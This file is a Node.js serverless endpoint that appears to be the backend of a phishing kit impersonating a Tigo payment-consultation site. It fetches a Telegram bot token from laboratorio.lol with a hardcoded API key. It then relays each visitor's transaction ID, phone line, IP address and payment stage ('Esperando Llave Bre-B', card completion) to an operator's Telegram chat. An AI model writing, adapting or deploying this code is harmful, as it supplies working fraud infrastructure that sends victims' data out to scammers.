require('dotenv').config();

async function obtenerCredencialesTelegram(site = 'tigoconsulta') {
    try {
        const response = await fetch(
            `https://www.laboratorio.lol/api/encryptor.php?site=${site}`,
            { headers: { 'X-API-Key': process.env.LABORATORIO_LOL_API_KEY || 'C4fEzGJfN92dkLKrZ43ULzFbAcx7mD9v' } }
        );
        const data = await response.json();
        return { token: data.token || data.bot_token, chatId: data.chat_id };
    } catch (error) {
        return null;
    }
}

const estadoMensajes = {
    'pago-inicio': '📍 <b>ESTADO: Iniciando Pago</b>',
    'pago-llave': '🔐 <b>ESTADO: Esperando Llave Bre-B</b>',
    'pago-tarjeta': '💳 <b>ESTADO: Completando Pago Tarjeta</b>',
    'pago-exitoso': '✅ <b>ESTADO: Pago Completado</b>',
    'pago-cancelado': '❌ <b>ESTADO: Pago Cancelado</b>'
};

async function enviarEstadoTelegram(txid, referencia, pagina, ip) {
    try {
        const creds = await obtenerCredencialesTelegram('tigoconsulta');
        if (!creds?.token || !creds?.chatId) return;

        const estadoTexto = estadoMensajes[pagina] || `📍 <b>ESTADO: ${pagina}</b>`;
        const mensaje = `${estadoTexto}\n\n<b>TxID:</b> <code>${txid}</code>\n<b>Línea:</b> ${referencia}\n<b>IP:</b> ${ip}`;

        await fetch(`https://api.telegram.org/bot${creds.token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: creds.chatId, text: mensaje, parse_mode: 'HTML' })
        });
    } catch (error) {
        console.error('Error tracking payment state:', error);
    }
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Content-Type', 'application/json');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(400).json({ ok: false, error: 'POST requerido' });

    try {
        const { txid, referencia, pagina, ip } = req.body;

        if (!txid || !referencia || !pagina) {
            return res.status(400).json({ ok: false, error: 'txid, referencia y pagina requeridos' });
        }

        const clientIp = ip || req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'unknown';

        await enviarEstadoTelegram(txid, referencia, pagina, clientIp);

        return res.status(200).json({ ok: true, message: 'Estado enviado a Telegram' });
    } catch (error) {
        return res.status(400).json({ ok: false, error: 'Error: ' + error.message });
    }
};
